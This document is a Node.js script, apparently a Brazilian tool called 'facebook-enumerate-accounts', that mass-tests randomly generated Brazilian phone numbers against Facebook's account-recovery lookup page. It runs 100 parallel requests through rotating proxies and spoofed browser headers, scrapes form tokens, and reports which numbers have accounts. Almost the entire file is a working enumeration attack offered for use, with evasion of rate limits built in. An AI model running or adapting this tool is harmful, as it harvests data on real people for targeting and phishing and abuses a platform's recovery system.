    
/*
 ___________  _________________ _   _ _   _ _____ 
|_   _| ___ \/  ___| ___ \ ___ \ | | | \ | |  _  |
  | | | |_/ /\ `--.| |_/ / |_/ / | | |  \| | | | |
  | | |  __/  `--. \ ___ \    /| | | | . ` | | | |
 _| |_| |    /\__/ / |_/ / |\ \| |_| | |\  \ \_/ /
 \___/\_|    \____/\____/\_| \_|\___/\_| \_/\___/ 
 
 Tool: facebook-enumerate-accounts
 Date: 07/08/2019 
*/
var request = require('request');
var faker = require('faker');

/*
* list.txt terá sua lista (de preferencia enorme de proxys)
*/
var proxys = require("fs").readFileSync("list.txt").toString().split("\n");

faker.locale = "pt_BR";



var threads = 100;
var th = 0;
setInterval(function () {
	if (threads > th) {
		/*
		* Aqui vou gerar o número de telefone fake pelo faker.js
		* Já gera um número brasileiro a fins de testes
		*/
		let number = "+55" + faker.phone.phoneNumberFormat().split("(").join('').split(")").join('').split(" ").join('').split("-").join('');
		test(number);
	}
}, 10);


function test(number) {

	var proxy = 'http://'+proxys [Math.floor(Math.random() * proxys .length)].trim();

	th++;
	var headers = {
		'authority': 'mbasic.facebook.com',
		'pragma': 'no-cache',
		'cache-control': 'no-cache',
		'upgrade-insecure-requests': '1',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'accept-encoding': 'text',
		'accept-language': 'pt-BR,pt;q=0.9'
	};

	var options = {
		url: 'https://mbasic.facebook.com/login/identify/?ctx=recover',
		headers: headers,
		followAllRedirects: true,
		encoding: null, proxy: proxy
	}


	request(options, function (error, response, body) {
		if(error) return th--;
		if (!error && response.statusCode == 200) {
			var jazoest = body.toString('utf8').split('"jazoest" value="')[1].split('"')[0];
			var lsd = body.toString('utf8').split('"lsd" value="')[1].split('"')[0];
			var email = number;
			var cookies = response.headers['set-cookie'].map(c => c.substr(0, c.indexOf(";"))).reduce((a, b) => a + "; " + b);
			var imageSet = "https://static" + body.toString('utf8').split('><img src="https://static')[1].split('"')[0];
			set(cookies, imageSet, function () {


				var subHeaders = {
					'authority': 'mbasic.facebook.com',
					'pragma': 'no-cache',
					'cache-control': 'no-cache',
					'origin': 'https://mbasic.facebook.com',
					'upgrade-insecure-requests': '1',
					'content-type': 'application/x-www-form-urlencoded',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&_rdr',
					'accept-encoding': 'text',
					'accept-language': 'pt-BR,pt;q=0.9',
					'cookie': cookies
				};

				var subDataString = 'lsd=' + lsd + '&jazoest=' + jazoest + '&email=' + email + '&did_submit=Pesquisar';

				var subOptions = {
					url: 'https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0',
					method: 'POST',
					headers: subHeaders,
					body: subDataString,
					encoding: null, proxy: proxy
				};


				request(subOptions, function (error, response, body) {

					th--;

					if(!error &&  !response.headers['location']) {
						return console.log("Não existe ", number, " Proxy: ", proxy );
					}

					console.log("Existe ", number, " Proxy: ", proxy );


					/*
					// Aqui é feita uma última requisição
					// Uma vez encontrada a conta nossa nova URL vira no Location
				
					var headerss = : {
											'authority': 'mbasic.facebook.com',
											'pragma': 'no-cache',
											'cache-control': 'no-cache',
											'upgrade-insecure-requests': '1',
											'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99',
											'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
											'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover',
											'accept-encoding': 'text',
											'accept-language': 'pt-BR,pt;q=0.9',
											'cookie': cookies + ";" + response.headers['set-cookie']
										}
			
							request({
										url: response.headers['location'],
										enconding: null, headers: headerss
										
									},
									function (error, response, body) {
										if (!error && response.statusCode == 200) {
											//console.log(body)
										}
									}
									*/
	


				});

			})




		}
	});

	function dataCookieToString(dataCookie) {
		var t = "";
		for (var x = 0; x < dataCookie.length; x++) {
			t += ((t != "") ? "; " : "") + dataCookie[x].key + "=" + dataCookie[x].value;
		}
		return t;
	}

	function set(cookie, imageSet, callback) {
		request({
			url: 'https://facebook.com/security/hsts-pixel.gif?c=3.2',
			followAllRedirects: true, proxy: proxy,
			headers: {
				'pragma': 'no-cache',
				'cookie': cookie,
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'pt-BR,pt;q=0.9',
				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99',
				'accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
				'cache-control': 'no-cache',
				'authority': 'facebook.com',
				'referer': 'https://mbasic.facebook.com/'
			}
		}, function (error, response, body) {
			if(error) return th--;
			if (!error && response.statusCode == 200) {
				callback();
			}
		});

		return true
	}

}


